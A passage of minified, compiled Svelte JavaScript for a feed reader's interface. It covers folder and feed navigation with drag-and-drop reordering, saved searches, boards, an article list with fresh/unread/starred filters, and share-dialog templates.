svelte-181dlmc`,null,a,c),Y(i,`data-testid`,`feed-${t().id??``}`),Si(o,`background:${u??``}`),G(s,d),G(l,t().title_override||t().title),Y(_,`data-testid`,`feed-actions-${t().id??``}`)},[()=>({muted:t().muted,errored:(t().error_count??0)>=3,"drop-target":pe(V(de),{kind:`feed`,id:t().subscription_id,cat:t().category_id??0})}),()=>({active:$e(t().id),read:t().unread===0}),()=>we(t().id),()=>Te(t().title_override||t().title)]),H(`click`,i,()=>De(t().id)),H(`click`,_,e=>{e.stopPropagation(),F(te,V(te)===t().id?null:t().id,!0)}),H(`dragstart`,n,e=>he(e,t())),H(`dragover`,n,e=>ge(e,{kind:`feed`,id:t().subscription_id,cat:t().category_id??0})),H(`dragleave`,n,()=>F(de,null)),H(`drop`,n,e=>ye(e,t())),H(`dragend`,n,_e),W(e,n)},p=P(null),m=P(!1);async function h(){if(V(p)){F(m,!0);try{await V(p).run(),F(p,null)}finally{F(m,!1)}}}let g=hn({}),_=P(!1),v=P(!1),y=P(void 0);Vn(()=>{V(v)&&V(y)?.focus()});let b=P(!1),x=P(``),S=P(``),C=P(``),w=P(!1),ee=P(!1),te=P(null),T=P(null),E=P(null),ne=P(``),re=P(null),D=[`#3b82c4`,`#4f7a3d`,`#b07d1a`,`#a93b16`,`#7a3d8b`,`#1d4ed8`,`#7c4a2a`,`#5b6770`];function O(e){let t=e.target;V(te)!==null&&!t.closest(`[data-feed-menu-for]`)&&!t.closest(`[data-feed-actions-trigger]`)&&F(te,null),V(T)!==null&&!t.closest(`[data-cat-menu-for]`)&&!t.closest(`[data-cat-actions-trigger]`)&&!t.closest(`[data-cat-color-for]`)&&(F(T,null),F(re,null))}Gi(()=>document.addEventListener(`click`,O)),Ki(()=>document.removeEventListener(`click`,O));async function ie(e){F(te,null);try{await $.updateFeed(e.subscription_id,{muted:!e.muted}),await ca()}catch(e){console.error(`toggleMute`,e)}}async function ae(e){F(te,null),F(p,{title:`Unsubscribe?`,message:`Remove "${e.title_override||e.title}" from your list. The feed itself stays available for other users.`,confirmLabel:`Unsubscribe`,destructive:!0,run:()=>oe(e)},!0)}async function oe(e){try{await $.deleteFeed(e.subscription_id),await ca(),n().kind===`feed`&&n().id===e.id&&Ee(`fresh`)}catch(e){console.error(`deleteFeed`,e)}}async function se(e){F(te,null);try{let t=await $.resummarizeFeed(e.subscription_id);alert(`Re-enqueued ${t.data.enqueued} of ${t.data.reset} skipped articles for summarization.`),await ca()}catch(e){console.error(`resummarize`,e)}}async function ce(e){F(te,null);try{await $.markAllRead({feed_id:e.id}),await Promise.all([ja(n()),ca()])}catch(e){console.error(`markFeedRead`,e)}}let le=Qt(()=>{let e=new Map,t=[];for(let n of r())if(n.category_id){let t=e.get(n.category_id)??[];t.push(n),e.set(n.category_id,t)}else t.push(n);return{byCat:e,uncat:t}}),ue=P(null),de=P(null);function fe(e){return e.kind===`folder`?`folder:${e.id}`:`feed:${e.id}:${e.cat}`}function pe(e,t){return!e||!t?!1:fe(e)===fe(t)}function me(e,t){F(ue,{kind:`folder`,id:t},!0),e.dataTransfer?.setData(`text/x-ember`,fe(V(ue))),e.dataTransfer&&(e.dataTransfer.effectAllowed=`move`)}function he(e,t){F(ue,{kind:`feed`,id:t.subscription_id,cat:t.category_id??0},!0),e.dataTransfer?.setData(`text/x-ember`,fe(V(ue))),e.dataTransfer&&(e.dataTransfer.effectAllowed=`move`)}function ge(e,t){!V(ue)||V(ue).kind!==t.kind||V(ue).kind===`feed`&&t.kind===`feed`&&V(ue).cat!==t.cat||(e.preventDefault(),e.dataTransfer&&(e.dataTransfer.dropEffect=`move`),F(de,t,!0))}function _e(){F(ue,null),F(de,null)}async function ve(e,t){if(e.preventDefault(),!V(ue)||V(ue).kind!==`folder`||V(ue).id===t){_e();return}let n=i().map(e=>e.id),r=n.indexOf(V(ue).id),a=n.indexOf(t);if(r<0||a<0){_e();return}let[o]=n.splice(r,1);n.splice(a,0,o),ra.update(e=>{let t=new Map(e.map(e=>[e.id,e]));return n.map((e,n)=>({...t.get(e),position:n}))}),_e();try{await $.reorderCategories(n)}catch(e){console.error(`reorderCategories`,e),await ca()}}async function ye(e,t){if(e.preventDefault(),!V(ue)||V(ue).kind!==`feed`){_e();return}if(V(ue).id===t.subscription_id){_e();return}if(V(ue).cat!==(t.category_id??0)){_e();return}let n=(t.category_id?V(le).byCat.get(t.category_id)??[]:V(le).uncat).slice().map(e=>e.subscription_id),r=n.indexOf(V(ue).id),i=n.indexOf(t.subscription_id);if(r<0||i<0){_e();return}let[a]=n.splice(r,1);n.splice(i,0,a),na.update(e=>{let t=new Map(n.map((e,t)=>[e,t]));return e.slice().sort((e,n)=>{let r=t.get(e.subscription_id),i=t.get(n.subscription_id);return r!==void 0&&i!==void 0?r-i:r===void 0?i===void 0?0:1:-1})}),_e();try{await $.reorderFeeds(n)}catch(e){console.error(`reorderFeeds`,e),await ca()}}function be(e){let t=0,n=V(le).byCat.get(e)??[];for(let e of n)t+=e.unread||0;return t}let xe=[`#3b82c4`,`#4f7a3d`,`#b07d1a`,`#c2451d`,`#7a3d8b`,`#1d4ed8`];function Se(e){return xe[e%xe.length]}let Ce=[`#ff6154`,`#0a0a0a`,`#e63946`,`#1d4ed8`,`#623ce6`,`#ee0000`,`#326ce5`,`#111`,`#cc0000`,`#bb1919`];function we(e){return Ce[e%Ce.length]}function Te(e){return(e?.[0]??`?`).toUpperCase()}function Ee(e){da.set({kind:`smart`,view:e}),ja({kind:`smart`,view:e})}function De(e){da.set({kind:`feed`,id:e}),ja({kind:`feed`,id:e})}function Oe(e){da.set({kind:`category`,id:e}),ja({kind:`category`,id:e})}function ke(e){da.set({kind:`board`,id:e}),ja({kind:`board`,id:e})}function Ae(e,t){let n={kind:`search`,query:t,savedID:e};da.set(n),ja(n)}let je=P(!1),Me=P(``),k=P(``),Ne=P(!1);async function A(e){if(e.preventDefault(),!(!V(Me).trim()||!V(k).trim())){F(Ne,!0);try{await $.createSavedSearch(V(Me).trim(),V(k).trim()),F(Me,``),F(k,``),F(je,!1),await ca()}catch(e){console.error(`createSavedSearch`,e)}finally{F(Ne,!1)}}}function Pe(e,t){F(p,{title:`Delete saved search?`,message:`Remove "${t}" from your saved searches.`,confirmLabel:`Delete`,destructive:!0,run:async()=>{try{await $.deleteSavedSearch(e),await ca()}catch(e){console.error(`deleteSavedSearch`,e)}}},!0)}function Fe(e){return n().kind===`search`&&n().savedID===e}function Le(e){g[e]=!g[e]}function Re(e,t){F(T,null),F(E,e,!0),F(ne,t,!0)}async function ze(e){let t=V(ne).trim();if(F(E,null),t)try{await $.updateCategory(e,{name:t}),await ca()}catch(e){console.error(`rename category`,e)}}function Be(){F(E,null)}async function Ve(e,t){F(re,null),F(T,null);try{await $.updateCategory(e,{color:t}),await ca()}catch(e){console.error(`color category`,e)}}async function He(e,t){F(T,null),F(p,{title:`Delete folder?`,message:`Delete "${t}". Feeds inside it become uncategorized.`,confirmLabel:`Delete`,destructive:!0,run:()=>Ue(e)},!0)}async function Ue(e){try{await $.deleteCategory(e),await ca(),n().kind===`category`&&n().id===e&&Ee(`fresh`)}catch(e){console.error(`delete category`,e)}}async function We(e){if(e.preventDefault(),V(C).trim()){F(ee,!0);try{await $.createBoard(V(C).trim()),F(C,``),F(w,!1),await ca()}catch(e){console.error(`createBoard`,e)}finally{F(ee,!1)}}}async function Ge(e,t){F(p,{title:`Delete board?`,message:`Delete the board "${t}". Articles inside it stay in your library.`,confirmLabel:`Delete`,destructive:!0,run:()=>Ke(e)},!0)}async function Ke(e){try{await $.deleteBoard(e),await ca(),n().kind===`board`&&n().id===e&&(da.set({kind:`smart`,view:`fresh`}),ja({kind:`smart`,view:`fresh`}))}catch(e){console.error(`deleteBoard`,e)}}function Ye(e){return n().kind===`board`&&n().id===e}async function Xe(e){if(e.preventDefault(),V(x).trim()){F(S,``),F(b,!0);try{await $.addFeed(V(x).trim()),F(x,``),F(v,!1),await ca(),await ja(n()),setTimeout(()=>{ca()},2e3)}catch(e){F(S,e instanceof Z?e.message:String(e),!0)}finally{F(b,!1)}}}function Ze(){F(v,!1),F(x,``),F(S,``)}function Qe(e){return n().kind===`smart`&&n().view===e}function $e(e){return n().kind===`feed`&&n().id===e}function et(e){return n().kind===`category`&&n().id===e}var tt=Yo(),nt=L(tt),rt=I(nt),it=I(rt),at=I(it);let ot;var st=R(at,2);let ct;var lt=R(I(st),4),ut=e=>{var t=Oo(),n=I(t,!0);j(t),z(()=>G(n,a().fresh)),W(e,t)};K(lt,e=>{a().fresh>0&&e(ut)}),j(st);var dt=R(st,2);let ft;var pt=R(I(dt),4),mt=e=>{var t=ko(),n=I(t,!0);j(t),z(()=>G(n,o())),W(e,t)};K(pt,e=>{o()>0&&e(mt)}),j(dt);var ht=R(dt,2);let _t;var vt=R(I(ht),4),yt=e=>{var t=Ao(),n=I(t,!0);j(t),z(()=>G(n,a().starred)),W(e,t)};K(vt,e=>{a().starred>0&&e(yt)}),j(ht);var bt=R(ht,2);let xt;var N=R(I(bt),4),St=e=>{var t=jo(),n=I(t,!0);j(t),z(()=>G(n,a().later)),W(e,t)};K(N,e=>{a().later>0&&e(St)}),j(bt);var Ct=R(bt,2);let wt;var Tt=R(I(Ct),4),Et=e=>{var t=Mo(),n=I(t,!0);j(t),z(()=>G(n,a().shared)),W(e,t)};K(Tt,e=>{a().shared>0&&e(Et)}),j(Ct),j(it);var Dt=R(it,2),Ot=R(I(Dt),2);li(Ot,1,i,e=>e.id,(e,t)=>{var n=zo();let r;var i=I(n),a=I(i),o=R(a,2),s=R(o,2),c=e=>{var n=No();J(n),An(n,!0),z(()=>Y(n,`data-testid`,`folder-rename-${V(t).id??``}`)),X(n,()=>V(ne),e=>F(ne,e)),H(`keydown`,n,e=>{e.key===`Enter`&&ze(V(t).id),e.key===`Escape`&&Be()}),H(`blur`,n,()=>ze(V(t).id)),W(e,n)},l=e=>{var n=Po();let r;var i=I(n,!0);j(n),z(e=>{r=q(n,1,`folder-name svelte-181dlmc`,null,r,e),Y(n,`data-testid`,`folder-name-${V(t).id??``}`),G(i,V(t).name)},[()=>({active:et(V(t).id)})]),H(`click`,n,()=>Oe(V(t).id)),H(`dblclick`,n,()=>Re(V(t).id,V(t).name)),W(e,n)};K(s,e=>{V(E)===V(t).id?e(c):e(l,-1)});var u=R(s,2),d=e=>{var n=Fo(),r=I(n,!0);j(n),z(e=>G(r,e),[()=>be(V(t).id)]),W(e,n)},p=Qt(()=>be(V(t).id)>0&&V(E)!==V(t).id);K(u,e=>{V(p)&&e(d)});var m=R(u,2),h=R(m,2),_=e=>{var n=Io(),r=I(n),i=R(r,2),a=R(i,2);j(n),z(()=>{Y(n,`data-cat-menu-for`,V(t).id),Y(r,`data-testid`,`folder-rename-action-${V(t).id??``}`),Y(i,`data-testid`,`folder-color-action-${V(t).id??``}`),Y(a,`data-testid`,`folder-delete-action-${V(t).id??``}`)}),H(`click`,r,()=>Re(V(t).id,V(t).name)),H(`click`,i,()=>{F(re,V(t).id,!0),F(T,null)}),H(`click`,a,()=>He(V(t).id,V(t).name)),W(e,n)};K(h,e=>{V(T)===V(t).id&&e(_)});var v=R(h,2),y=e=>{var n=Ro();li(n,20,()=>D,e=>e,(e,n)=>{var r=Lo();z(()=>{Si(r,`background:${n??``}`),Y(r,`aria-label`,`Pick color ${n}`),Y(r,`data-testid`,`folder-swatch-${V(t).id??``}-${n??``}`)}),H(`click`,r,()=>Ve(V(t).id,n)),W(e,r)}),j(n),z(()=>Y(n,`data-cat-color-for`,V(t).id)),W(e,n)};K(v,e=>{V(re)===V(t).id&&e(y)}),j(i);var b=R(i,2);li(b,21,()=>V(le).byCat.get(V(t).id)??[],e=>e.id,(e,t)=>{f(e,()=>V(t))}),j(b),j(n),z((e,i)=>{r=q(n,1,`folder svelte-181dlmc`,null,r,e),Si(o,`background:${i??``}`),Y(m,`data-testid`,`folder-actions-${V(t).id??``}`)},[()=>({collapsed:g[V(t).id],"drop-target":pe(V(de),{kind:`folder`,id:V(t).id})}),()=>V(t).color||Se(V(t).id)]),H(`click`,a,()=>Le(V(t).id)),H(`click`,m,e=>{e.stopPropagation(),F(T,V(T)===V(t).id?null:V(t).id,!0),F(re,null)}),H(`dragstart`,i,e=>me(e,V(t).id)),H(`dragover`,i,e=>ge(e,{kind:`folder`,id:V(t).id})),H(`dragleave`,i,()=>F(de,null)),H(`drop`,i,e=>ve(e,V(t).id)),H(`dragend`,i,_e),W(e,n)});var kt=R(Ot,2),At=e=>{var t=Bo();let n;var r=I(t),i=I(r);Ie(4),j(r);var a=R(r,2);li(a,21,()=>V(le).uncat,e=>e.id,(e,t)=>{f(e,()=>V(t))}),j(a),j(t),z(()=>n=q(t,1,`folder svelte-181dlmc`,null,n,{collapsed:V(_)})),H(`click`,i,()=>F(_,!V(_))),W(e,t)};K(kt,e=>{V(le).uncat.length>0&&e(At)});var jt=R(kt,2),Mt=I(jt),Nt=e=>{var t=Vo();H(`click`,t,()=>F(v,!0)),W(e,t)},Pt=e=>{var t=Uo(),n=I(t);J(n),zi(n,e=>F(y,e),()=>V(y));var r=R(n,2),i=I(r),a=R(i,2),o=I(a,!0);j(a),j(r);var s=R(r,2),c=e=>{var t=Ho(),n=I(t,!0);j(t),z(()=>G(n,V(S))),W(e,t)};K(s,e=>{V(S)&&e(c)}),j(t),z(e=>{n.disabled=V(b),a.disabled=e,G(o,V(b)?`Adding…`:`Add`)},[()=>V(b)||!V(x).trim()]),X(n,()=>V(x),e=>F(x,e)),H(`click`,i,Ze),H(`submit`,t,Xe),W(e,t)};K(Mt,e=>{V(v)?e(Pt,-1):e(Nt)}),j(jt),j(Dt);var Ft=R(Dt,2),It=I(Ft),Lt=R(I(It),2);j(It);var Rt=R(It,2),zt=e=>{var t=Wo(),n=I(t);J(n);var r=R(n,2);J(r);var i=R(r,2),a=I(i),o=R(a,2),s=I(o,!0);j(o),j(i),j(t),z(e=>{n.disabled=V(Ne),r.disabled=V(Ne),o.disabled=e,G(s,V(Ne)?`…`:`Save`)},[()=>V(Ne)||!V(Me).trim()||!V(k).trim()]),X(n,()=>V(Me),e=>F(Me,e)),X(r,()=>V(k),e=>F(k,e)),H(`click`,a,()=>{F(je,!1),F(Me,``),F(k,``)}),H(`submit`,t,A),W(e,t)};K(Rt,e=>{V(je)&&e(zt)}),li(R(Rt,2),1,s,e=>e.id,(e,t)=>{var n=Go(),r=I(n);let i;var a=R(I(r),2),o=I(a,!0);j(a),j(r);var s=R(r,2);j(n),z(e=>{i=q(r,1,`nav-item board-item svelte-181dlmc`,null,i,e),Y(r,`data-testid`,`saved-search-${V(t).id??``}`),G(o,V(t).name),Y(s,`data-testid`,`saved-search-delete-${V(t).id??``}`)},[()=>({active:Fe(V(t).id)})]),H(`click`,r,()=>Ae(V(t).id,V(t).query)),H(`click`,s,()=>Pe(V(t).id,V(t).name)),W(e,n)}),j(Ft);var Bt=R(Ft,2),Vt=I(Bt),Ht=R(I(Vt),2);j(Vt);var Ut=R(Vt,2),Wt=e=>{var t=Ko(),n=I(t);J(n);var r=R(n,2),i=I(r),a=R(i,2),o=I(a,!0);j(a),j(r),j(t),z(e=>{n.disabled=V(ee),a.disabled=e,G(o,V(ee)?`…`:`Add`)},[()=>V(ee)||!V(C).trim()]),X(n,()=>V(C),e=>F(C,e)),H(`click`,i,()=>{F(w,!1),F(C,``)}),H(`submit`,t,We),W(e,t)};K(Ut,e=>{V(w)&&e(Wt)}),li(R(Ut,2),1,c,e=>e.id,(e,t)=>{var n=qo(),r=I(n);let i;var a=R(I(r),2),o=I(a,!0);j(a),j(r);var s=R(r,2);j(n),z(e=>{i=q(r,1,`nav-item board-item svelte-181dlmc`,null,i,e),Y(r,`data-testid`,`board-${V(t).id??``}`),G(o,V(t).name),Y(s,`data-testid`,`board-delete-${V(t).id??``}`)},[()=>({active:Ye(V(t).id)})]),H(`click`,r,()=>ke(V(t).id)),H(`click`,s,()=>Ge(V(t).id,V(t).name)),W(e,n)}),j(Bt),j(rt);var Gt=R(rt,2),Kt=e=>{var t=Jo(),n=R(I(t),2),r=I(n);j(n),j(t),z(()=>G(r,`Summarizing ${a().pending_summary??``}
+        ${a().pending_summary===1?`article`:`articles`}…`)),W(e,t)};K(Gt,e=>{a().pending_summary>0&&e(Kt)}),j(nt);var qt=R(nt,2),Jt=e=>{{let t=Qt(()=>V(p).confirmLabel??`Confirm`),n=Qt(()=>V(p).destructive??!1);So(e,{get title(){return V(p).title},get message(){return V(p).message},get confirmLabel(){return V(t)},get destructive(){return V(n)},get busy(){return V(m)},onConfirm:h,onCancel:()=>F(p,null)})}};K(qt,e=>{V(p)&&e(Jt)}),z((e,t,n,r,i,a)=>{ot=q(at,1,`nav-item svelte-181dlmc`,null,ot,e),ct=q(st,1,`nav-item svelte-181dlmc`,null,ct,t),ft=q(dt,1,`nav-item svelte-181dlmc`,null,ft,n),_t=q(ht,1,`nav-item svelte-181dlmc`,null,_t,r),xt=q(bt,1,`nav-item svelte-181dlmc`,null,xt,i),wt=q(Ct,1,`nav-item svelte-181dlmc`,null,wt,a)},[()=>({active:Qe(`today`)}),()=>({active:Qe(`fresh`)}),()=>({active:Qe(`unread`)}),()=>({active:Qe(`starred`)}),()=>({active:Qe(`later`)}),()=>({active:Qe(`shared`)})]),H(`click`,at,()=>Ee(`today`)),H(`click`,st,()=>Ee(`fresh`)),H(`click`,dt,()=>Ee(`unread`)),H(`click`,ht,()=>Ee(`starred`)),H(`click`,bt,()=>Ee(`later`)),H(`click`,Ct,()=>Ee(`shared`)),H(`click`,Lt,()=>F(je,!V(je))),H(`click`,Ht,()=>F(w,!V(w))),W(e,tt),Je(),u()}var Zo=U(`<button class="clear-search-inline svelte-yuj9cu" aria-label="Clear search" title="Back to Fresh" data-testid="list-clear-search">×</button>`),Qo=U(`<p class="empty svelte-yuj9cu">Loading…</p>`),$o=U(`<p class="empty error svelte-yuj9cu"> </p>`),es=U(`<p class="empty svelte-yuj9cu" data-testid="onboarding-empty">No feeds yet.</p>`),ts=U(`<p class="empty svelte-yuj9cu">No articles in this view.</p>`),ns=U(`<span class="src-meta svelte-yuj9cu"> </span>`),rs=U(`<span class="tag-badge svelte-yuj9cu"> </span>`),is=U(`<span class="fresh-tag svelte-yuj9cu">Fresh</span>`),as=U(`<span class="dup-tag svelte-yuj9cu" title="Also published in other feeds you subscribe to"> </span>`),os=U(`<img class="story-thumb svelte-yuj9cu" alt="" loading="lazy"/>`),ss=U(`<span class="story-excerpt svelte-yuj9cu"> </span>`),cs=Zr(`<svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true" class="svelte-yuj9cu"><path d="M12 2l3 6.3 6.9 1-5 4.9 1.2 6.8L12 17.8 5.9 21l1.2-6.8-5-4.9 6.9-1z" class="svelte-yuj9cu"></path></svg> Starred`,1),ls=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true" class="svelte-yuj9cu"><path d="M12 2l3 6.3 6.9 1-5 4.9 1.2 6.8L12 17.8 5.9 21l1.2-6.8-5-4.9 6.9-1z" class="svelte-yuj9cu"></path></svg> Star`,1),us=U(`<article><span class="unread-dot svelte-yuj9cu" aria-hidden="true"></span> <button class="story-link svelte-yuj9cu"><span class="story-top svelte-yuj9cu"><span class="src svelte-yuj9cu"><span class="favicon svelte-yuj9cu" aria-hidden="true"> </span> </span> <span class="src-meta svelte-yuj9cu"> </span> <!> <!> <!> <!></span> <span class="story-title svelte-yuj9cu"> </span> <!> <!></button> <div class="story-foot svelte-yuj9cu"><button><!></button> <button><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true" class="svelte-yuj9cu"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" class="svelte-yuj9cu"></path></svg> </button></div></article>`),ds=U(`<section class="list-col svelte-yuj9cu" data-testid="article-list"><div class="list-header svelte-yuj9cu"><div class="list-title-row svelte-yuj9cu"><div class="svelte-yuj9cu"><div class="list-title svelte-yuj9cu"> <!></div> <div class="list-sub svelte-yuj9cu"><span class="poll-dot svelte-yuj9cu" aria-hidden="true"></span> </div></div></div> <div class="list-tools svelte-yuj9cu"><button data-testid="pill-fresh"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-yuj9cu"><path d="M13 2L3 14h9l-1 8 10-12h-9z" class="svelte-yuj9cu"></path></svg> Fresh only</button> <button data-testid="pill-unread"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-yuj9cu"><circle cx="12" cy="12" r="9" class="svelte-yuj9cu"></circle></svg> Unread</button> <button class="pill svelte-yuj9cu" data-testid="mark-all-read"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-yuj9cu"><path d="M20 6L9 17l-5-5" class="svelte-yuj9cu"></path></svg> Mark all read</button> <span class="spacer svelte-yuj9cu"></span> <div class="seg svelte-yuj9cu"><button>Cards</button> <button>Compact</button></div></div></div> <div><!> <!></div></section>`);function fs(e,t){qe(t,!0);let n=()=>M(da,`$activeView`,u),r=()=>M(na,`$feeds`,u),i=()=>M(ra,`$categories`,u),a=()=>M(ia,`$boards`,u),o=()=>M(Da,`$articles`,u),s=()=>M(Qi,`$freshWindowSeconds`,u),c=()=>M(Sa,`$density`,u),l=()=>M(fa,`$selectedArticleId`,u),[u,d]=gt(),f=P(void 0),p=P(!1),m=P(!1);Vn(()=>{n(),V(f)&&(V(f).scrollTop=0)});function h(e){fa.set(e)}function g(){let e={kind:`smart`,view:`fresh`};da.set(e),ja(e)}function _(){V(f)&&V(f).scrollTop<=12&&ft(ka)>0&&ka.set(0)}let v=Qt(()=>{switch(n().kind){case`smart`:return{fresh:`Fresh`,today:`Today`,unread:`All Unread`,starred:`Starred`,later:`Read Later`,shared:`Shared with me`}[n().view];case`feed`:{let e=r().find(e=>e.id===n().id);return e?e.title_override||e.title:`Feed`}case`category`:{let e=i().find(e=>e.id===n().id);return e?e.name:`Folder`}case`board`:{let e=a().find(e=>e.id===n().id);return e?e.name:`Board`}case`search`:return`Search: ${n().query}`}}),y=Qt(()=>{let e=o().items.length;return o().loading?`Loading…`:e===0?`No articles`:`${e} article${e===1?``:`s`}`}),b=Qt(()=>{let e=new Map;for(let t of r())e.set(t.id,t);return e}),x=[`#ff6154`,`#0a0a0a`,`#e63946`,`#1d4ed8`,`#623ce6`,`#ee0000`,`#326ce5`,`#111`,`#cc0000`,`#bb1919`];function S(e){return x[e%x.length]}function C(e){let t=V(b).get(e.feed_id);return t?t.title_override||t.title:`—`}function w(e){return(C(e)[0]??`?`).toUpperCase()}function ee(e){if(!e)return``;let t=Date.now()/1e3-e;return t<60?`just now`:t<3600?`${Math.round(t/60)} min ago`:t<86400?`${Math.round(t/3600)} hr ago`:`${Math.round(t/86400)} d ago`}function te(e){return e?Date.now()/1e3-e<s():!1}function T(e){let t=e.content_text||(e.content_html?e.content_html.replace(/<[^>]+>/g,` `):``);if(!t)return 0;let n=t.trim().split(/\s+/).length;return Math.max(1,Math.round(n/200))}let E=Qt(()=>{let e=o().items;return V(p)&&(e=e.filter(e=>te(e.published_at))),V(m)&&(e=e.filter(e=>!e.is_read)),e});async function ne(){let e={};n().kind===`feed`&&(e={feed_id:n().id}),n().kind===`category`&&(e={category_id:n().id}),n().kind===`board`&&(e={board_id:n().id}),n().kind===`smart`&&(e={view:n().view}),await $.markAllRead(e),await Promise.all([ja(ft(da)),ca()])}var re=ds(),D=I(re),O=I(D),ie=I(O),ae=I(ie),oe=I(ae),se=R(oe),ce=e=>{var t=Zo();H(`click`,t,g),W(e,t)};K(se,e=>{n().kind===`search`&&e(ce)}),j(ae);var le=R(ae,2),ue=R(I(le),1,!0);j(le),j(ie),j(O);var de=R(O,2),fe=I(de);let pe;var me=R(fe,2);let he;var ge=R(me,2),_e=R(ge,4),ve=I(_e);let ye;var be=R(ve,2);let xe;j(_e),j(de),j(D);var Se=R(D,2);let Ce;var we=I(Se),Te=e=>{W(e,Qo())},Ee=e=>{var t=$o(),n=I(t);j(t),z(()=>G(n,`Error: ${o().err??``}`)),W(e,t)},De=e=>{W(e,es())},Oe=e=>{W(e,ts())};K(we,e=>{o().loading&&V(E).length===0?e(Te):o().err?e(Ee,1):V(E).length===0&&r().length===0?e(De,2):V(E).length===0&&e(Oe,3)}),li(R(we,2),17,()=>V(E),e=>e.id,(e,t)=>{var n=us();let r;var i=R(I(n),2),a=I(i),o=I(a),s=I(o),c=I(s,!0);j(s);var u=R(s);j(o);var d=R(o,2),f=I(d);j(d);var p=R(d,2),m=e=>{var n=ns(),r=I(n);j(n),z(e=>G(r,`· ${e??``} min read`),[()=>T(V(t))]),W(e,n)},g=Qt(()=>T(V(t))>0);K(p,e=>{V(g)&&e(m)});var _=R(p,2),v=e=>{var n=rs(),r=I(n,!0);j(n),z(e=>G(r,e),[()=>V(t).tags.split(`,`)[0].trim()]),W(e,n)};K(_,e=>{V(t).tags&&e(v)});var y=R(_,2),b=e=>{W(e,is())},x=Qt(()=>te(V(t).published_at)&&!V(t).is_read);K(y,e=>{V(x)&&e(b)});var E=R(y,2),ne=e=>{var n=as(),r=I(n);j(n),z(()=>{Y(n,`data-testid`,`dup-tag-${V(t).id??``}`),G(r,`Also in ${V(t).dup_count+1}`)}),W(e,n)};K(E,e=>{V(t).dup_count>0&&e(ne)}),j(a);var re=R(a,2),D=I(re,!0);j(re);var O=R(re,2),ie=e=>{var n=os();z(()=>Y(n,`src`,V(t).image_url)),H(`error`,n,e=>e.currentTarget.style.display=`none`),W(e,n)};K(O,e=>{V(t).image_url&&e(ie)});var ae=R(O,2),oe=e=>{var n=ss(),r=I(n,!0);j(n),z(()=>G(r,V(t).content_text)),W(e,n)};K(ae,e=>{V(t).content_text&&e(oe)}),j(i);var se=R(i,2),ce=I(se);let le;var ue=I(ce),de=e=>{var t=cs();Ie(),W(e,t)},fe=e=>{var t=ls();Ie(),W(e,t)};K(ue,e=>{V(t).is_starred?e(de):e(fe,-1)}),j(ce);var pe=R(ce,2);let me;var he=R(I(pe));j(pe),j(se),j(n),z((e,a,o,d)=>{r=q(n,1,`story svelte-yuj9cu`,null,r,{read:V(t).is_read,active:l()===V(t).id}),Y(n,`data-article-id`,V(t).id),Y(n,`data-is-read`,V(t).is_read?`1`:`0`),Y(n,`data-testid`,`story-${V(t).id??``}`),Y(i,`aria-label`,`Open article: ${V(t).title}`),Si(s,`background:${e??``}`),G(c,a),G(u,` ${o??``}`),G(f,`· ${d??``}`),G(D,V(t).title),Y(ce,`data-testid`,`star-${V(t).id??``}`),Y(ce,`aria-label`,V(t).is_starred?`Unstar article`:`Star article`),le=q(ce,1,`svelte-yuj9cu`,null,le,{starred:V(t).is_starred}),Y(pe,`aria-label`,V(t).is_later?`Remove from read later`:`Save for read later`),me=q(pe,1,`svelte-yuj9cu`,null,me,{starred:V(t).is_later}),G(he,` ${V(t).is_later?`Saved`:`Later`}`)},[()=>S(V(t).feed_id),()=>w(V(t)),()=>C(V(t)),()=>ee(V(t).published_at)]),H(`click`,i,()=>h(V(t).id)),H(`click`,ce,()=>Na(V(t).id,!V(t).is_starred)),H(`click`,pe,()=>Pa(V(t).id,!V(t).is_later)),W(e,n)}),j(Se),j(re),zi(re,e=>F(f,e),()=>V(f)),z(()=>{G(oe,`${V(v)??``} `),G(ue,V(y)),pe=q(fe,1,`pill fresh-toggle svelte-yuj9cu`,null,pe,{on:V(p)}),he=q(me,1,`pill svelte-yuj9cu`,null,he,{on:V(m)}),ye=q(ve,1,`svelte-yuj9cu`,null,ye,{on:c()===`card`}),xe=q(be,1,`svelte-yuj9cu`,null,xe,{on:c()===`compact`}),Ce=q(Se,1,`articles svelte-yuj9cu`,null,Ce,{compact:c()===`compact`})}),H(`click`,fe,()=>F(p,!V(p))),H(`click`,me,()=>F(m,!V(m))),H(`click`,ge,ne),H(`click`,ve,()=>Sa.set(`card`)),H(`click`,be,()=>Sa.set(`compact`)),H(`scroll`,re,_),W(e,re),Je(),d()}var ps=U(`<p class="error svelte-1b1u3cc" data-testid="share-error"> </p>`),ms=U(`<p class="ok svelte-1b1u3cc">Sent.</p>`),hs=U(`<p class="muted svelte-1b1u3cc">No other users to share with.</p>`),gs=U(`<option> </option>`),_s=U(`<label class="svelte-1b1u3cc"><span class="svelte-1b1u3cc">To</span> <select data-testid="share-to" class="svelte-1b1u3cc"><option>— pick a user —</option><!></select></label> <label class="svelte-1b1u3cc"><span class="svelte-1b1u3cc">Note (optional)</span> <textarea rows="3" data-testid="share-note" class="svelte-1b1u3cc"></textarea></label> <div class="actions svelte-1b1u3cc"><button class="ghost svelte-1b1u3cc">Cancel</button> <button data-testid="share-send" class="svelte-1b1u3cc"> </button></div>`,1),vs=U(`<label class="svelte-1b1u3cc"><span class="svelte-1b1u3cc">Recipient email</span> <input type="email" placeholder="friend@example.com" data-testid="share-email-to" class="svelte-1b1u3cc"/></label> <label class="svelte-1b1u3cc"><span class="svelte-1b1u3cc">Note (optional)</span> <textarea rows="3" class="svelte-1b1u3cc"></textarea></label> <p class="hint svelte-1b1u3cc">Opens your default mail client with the article title, summary, and link prefilled.</p> <div class="actions svelte-1b1u3cc"><button class="ghost svelte-1b1u3cc">Cancel</button> <button data-testid="share-email-send" class="svelte-1b1u3cc">Compose email</button></div>`,1),ys=U(`<p class="ok svelte-1b1u3cc" data-testid="share-link-msg"> </p>`),bs=U(`<label class="svelte-1b1u3cc"><span class="svelte-1b1u3cc">Article link</span> <input type="text" readonly="" data-testid="share-link-input" class="svelte-1b1u3cc"/></label> <!> <div class="actions svelte-1b1u3cc"><button class="ghost svelte-1b1u3cc">Close</button> 